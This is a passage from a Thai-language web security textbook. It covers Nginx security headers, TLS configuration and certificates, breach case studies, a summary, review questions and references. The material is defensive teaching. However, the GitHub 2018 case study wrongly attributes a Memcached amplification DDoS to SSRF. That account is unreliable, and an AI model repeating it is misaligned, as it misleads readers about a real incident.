add_header X-XSS-Protection "0" always;  # Deprecated — ใช้ CSP แทน
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
add_header Content-Security-Policy "
    default-src 'self';
    script-src 'self' 'nonce-$request_id';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data:;
    object-src 'none';
    frame-ancestors 'none';
    form-action 'self';
    base-uri 'self';
" always;
```

---

## 10. TLS/SSL บนเว็บเซิร์ฟเวอร์

### 10.1 TLS Termination

TLS Termination คือจุดที่ Traffic ที่เข้ารหัส HTTPS ถูกถอดรหัส (Decrypt) ก่อนส่งต่อไปยัง Web Server ภายใน:

**TLS Termination at Load Balancer:**
```
[Client] ──HTTPS──▶ [Load Balancer] ──HTTP──▶ [Web Server]
                     (TLS Termination)        (Unencrypted Internal)
```

**TLS Termination at Web Server:**
```
[Client] ──HTTPS──▶ [Web Server] ──HTTP──▶ [App Server]
                     (TLS Termination)      (Internal Network)
```

**TLS Offloading (SSL Offload):**
```
[Client] ──HTTPS──▶ [NGFW/LB] ──HTTP──▶ [Web Server]
                    ↑ TLS Offloading
                    Certificate + Private Key อยู่ที่ LB
                    Web Server ไม่เห็น Certificate เลย
```

### 10.2 TLS Configuration พื้นฐาน (Nginx)

```nginx
server {
    listen 443 ssl http2;
    server_name example.com;

    # Certificate
    ssl_certificate     /etc/ssl/certs/example.com.pem;
    ssl_certificate_key /etc/ssl/private/example.com.key;

    # Protocol — ปลอดภัยที่สุดเท่าที่รองรับ
    ssl_protocols TLSv1.2 TLSv1.3;

    # Cipher Suites
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers on;

    # ECDH Key Exchange
    ssl_ecdh_curve X25519:prime256v1:secp384r1;

    # OCSP Stapling
    ssl_stapling on;
    ssl_stapling_verify on;
    resolver 1.1.1.1 8.8.8.8 valid=300s;
    resolver_timeout 5s;

    # HSTS
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
}
```

### 10.3 TLS Certificate Management

| กิจกรรม | รายละเอียด |
|:--------|:-----------|
| **Certificate Acquisition** | Let's Encrypt (ACME), ซื้อจาก CA (DigiCert, Sectigo, GlobalSign) |
| **Auto-renewal** | Certbot (Let's Encrypt) — renew อัตโนมัติทุก 90 วัน |
| **Certificate Validation** | ตรวจสอบ SAN (Subject Alternative Name) ตรงกับ Domain หรือไม่ |
| **Revocation** | เมื่อ Private Key รั่วหรือ Certificate หมดอายุ |
| **Monitoring** | ตรวจสอบ Certificate Expiry — แจ้งเตือนก่อนหมดอายุ 30 วัน |

### 10.4 การตรวจสอบความปลอดภัย TLS

เครื่องมือที่ใช้ตรวจสอบ TLS Configuration:
- **SSL Labs (https://www.ssllabs.com/ssltest/)** — ให้คะแนน A+ สำหรับการตั้งค่าที่ดี
- **testssl.sh** — Script ตรวจสอบ TLS จาก Command Line
- **Nmap Script** — `nmap --script ssl-enum-ciphers -p 443 example.com`

---

## 11. กรณีศึกษา: การโจมตีเว็บไซต์จริง

### 11.1 กรณีศึกษา 1: Equifax Data Breach (2017)

**รายละเอียด:**
- ข้อมูลรั่วไหล: 147 ล้านคน (ชื่อ, SSN, วันเกิด, ที่อยู่, หมายเลขโทรศัพท์)
- สาเหตุ: **Apache Struts CVE-2017-5638** — ช่องโหว่ Remote Code Execution
- ไม่ได้ Patch เป็นเวลา 2 เดือนหลังจาก Patch ออก

**บทเรียน:**
1. Patch Management ล้มเหลว — ช่องโหว่ที่รู้จักและมี Patch แล้วแต่ไม่ถูกนำไปใช้
2. Defense in Depth — ถ้ามี WAF ที่ป้องกัน RCE ก็อาจช่วยลดความเสียหายได้
3. Network Segmentation — Database ควรแยกจาก Web Server
4. การสแกนช่องโหว่เป็นประจำสามารถตรวจพบและป้องกันได้

### 11.2 กรณีศึกษา 2: GitHub DDoS via SSRF (2018)

**รายละเอียด:**
- GitHub ถูกโจมตี DDoS ขนาด 1.35 Tbps
- ใช้เทคนิค Memcached Amplification (DRDoS)
- ใช้ SSRF ที่ Memcached Server เพื่อ Amplify Traffic

**บทเรียน:**
1. ปิด Memcached จากอินเทอร์เน็ต — ไม่ควรเปิด Public
2. SSRF Prevention — ตรวจสอบและจำกัด URL ที่ Fetch
3. DDoS Protection — ใช้ Cloud-based DDoS Mitigation (Cloudflare, Akamai)

### 11.3 กรณีศึกษา 3: SolarWinds Supply Chain Attack (2020)

**รายละเอียด:**
- ผู้โจมตีแทรก Backdoor ในอัปเดตซอฟต์แวร์ Orion
- ส่งผลกระทบต่อองค์กร 18,000+ แห่ง รวมถึงหน่วยงานรัฐบาลสหรัฐฯ
- ใช้การโจมตีแบบ Supply Chain — ไม่ใช่ช่องโหว่โดยตรงของ Web App

**บทเรียน:**
1. Supply Chain Risk — ตรวจสอบ Third-party Dependencies
2. Code Signing — ตรวจสอบ Integrity ของซอฟต์แวร์ก่อนติดตั้ง
3. Monitoring — ตรวจจับพฤติกรรมผิดปกติหลังการอัปเดต (Beaconing C2)

### 11.4 กรณีศึกษา 4: OWASP Top 10 Application Attack

**ช่องโหว่: SQL Injection ในเว็บร้านค้าออนไลน์**
```
Attack:
1. ผู้โจมตีพบว่าช่อง Search Product มี SQL Injection
2. UNION SELECT ดึงข้อมูล users table
3. ได้ Admin Credentials
4. ล็อกอินเป็น Admin
5. เข้าถึง Customer Database (ชื่อ, ที่อยู่, บัตรเครดิต)

แนวทางป้องกัน:
├── Parameterized Query
├── WAF (ModSecurity + CRS)
├── Input Validation
├── Least Privilege DB Account
└── เข้ารหัสข้อมูลอ่อนไหวใน Database (Credit Card Numbers)
```

---

## สรุปท้ายบท (Chapter Summary)

1. **SQL Injection** — แทรกคำสั่ง SQL ผ่าน Input — ป้องกันด้วย Parameterized Query (Prepared Statement), WAF, Least Privilege

2. **XSS** — แทรก JavaScript ในหน้าเว็บ — ป้องกันด้วย Output Encoding, CSP, HttpOnly Cookie

3. **CSRF** — หลอกให้ผู้ใช้ส่ง Request โดยไม่ตั้งใจ — ป้องกันด้วย CSRF Token, SameSite Cookie, Custom Header

4. **SSRF** — บังคับ Server ให้ Request URL ที่ผู้โจมตีกำหนด — ป้องกันด้วย URL Whitelist, Block Internal IPs, Network Segmentation

5. **Same-Origin Policy (SOP)** — ป้องกัน Cross-Origin Data Access — CORS เป็นกลไกที่ผ่อนปรน SOP อย่างปลอดภัย

6. **WAF** — ตรวจสอบ HTTP Traffic ป้องกันการโจมตี — ModSecurity + OWASP CRS เป็น Open Source Solution ที่ดี

7. **HTTP Security Headers** — HSTS (บังคับ HTTPS), CSP (ควบคุม Resource), X-Frame-Options (ป้องกัน Clickjacking), X-Content-Type-Options (ป้องกัน MIME Sniffing)

8. **TLS บนเว็บเซิร์ฟเวอร์** — ใช้ TLS 1.2/1.3, Cipher ที่ปลอดภัย, OCSP Stapling, HSTS

9. **กรณีศึกษา** แสดงให้เห็นว่าช่องโหว่ Web Application มีผลกระทบสูง — Patch Management, Defense in Depth, และ Monitoring มีความสำคัญ

---

## คำถามทบทวน (Review Questions)

1. จงอธิบายความแตกต่างระหว่าง SQL Injection แบบ In-band, Blind, และ Out-of-band พร้อมยกตัวอย่าง

2. Reflected XSS แตกต่างจาก Stored XSS และ DOM-based XSS อย่างไร จงยกตัวอย่างแต่ละประเภท

3. CSRF ทำงานอย่างไร และเหตุใด Same-Origin Policy ไม่สามารถป้องกัน CSRF ได้? จงอธิบายและเสนอแนวทางป้องกัน 3 วิธี

4. SSRF คืออะไร และเหตุใด SSRF จึงเป็นอันตรายต่อ Cloud-hosted Applications? จงอธิบายและเสนอแนวทางป้องกัน

5. จงอธิบายความแตกต่างระหว่าง Same-Origin Policy (SOP) และ Cross-Origin Resource Sharing (CORS) พร้อมตัวอย่าง HTTP Headers

6. WAF ที่ใช้ ModSecurity + OWASP CRS ใช้ Anomaly Scoring อย่างไร? จงอธิบายกระบวนการตรวจสอบ Request และการให้คะแนน

7. จงเขียน Content Security Policy (CSP) สำหรับเว็บแอปพลิเคชันที่ใช้ React (จาก CDN), Google Analytics, และ Images จาก S3 Bucket

8. จงอธิบาย HTTP Security Headers ต่อไปนี้: HSTS, X-Frame-Options, X-Content-Type-Options, และ SameSite Cookie — แต่ละตัวป้องกันการโจมตีแบบใด?

9. จากกรณีศึกษา Equifax Data Breach จงวิเคราะห์ว่ามาตรการป้องกันใดที่จะช่วยลดความรุนแรงของเหตุการณ์นี้ และเสนอแนวทางที่องค์กรควรปฏิบัติ

10. จงกำหนดค่า Nginx TLS สำหรับเว็บไซต์อีคอมเมิร์ซที่ต้องผ่าน PCI DSS Compliance — ระบุ TLS Version, Cipher Suites, HSTS, และ OCSP Stapling

---

## เอกสารอ้างอิง (References)

1. OWASP Foundation. (2024). *OWASP Top 10 — 2021*. Retrieved from https://owasp.org/Top10/

2. OWASP Foundation. (2024). *SQL Injection Prevention Cheat Sheet*. Retrieved from https://cheatsheetseries.owasp.org/

3. OWASP Foundation. (2024). *Cross-Site Scripting Prevention Cheat Sheet*. Retrieved from https://cheatsheetseries.owasp.org/

4. OWASP Foundation. (2024). *Cross-Site Request Forgery Prevention Cheat Sheet*. Retrieved from https://cheatsheetseries.owasp.org/

5. Stuttard, D., & Pinto, M. (2018). *The Web Application Hacker's Handbook* (2nd ed.). Wiley Publishing.

6. Zalewski, M. (2011). *The Tangled Web: A Guide to Securing Modern Web Applications*. No Starch Press.

7. ModSecurity Project. (2024). *ModSecurity Reference Manual*. Retrieved from https://github.com/owasp-modsecurity/

8. OWASP Core Rule Set Project. (2024). *OWASP ModSecurity Core Rule Set Documentation*. Retrieved from https://coreruleset.org/

9. Mozilla. (2024). *HTTP Observatory — Security Headers*. Retrieved from https://observatory.mozilla.org/

10. NIST Special Publication 800-95 Rev. 1. (2023). *Guide to Secure Web Services*. National Institute of Standards and Technology.
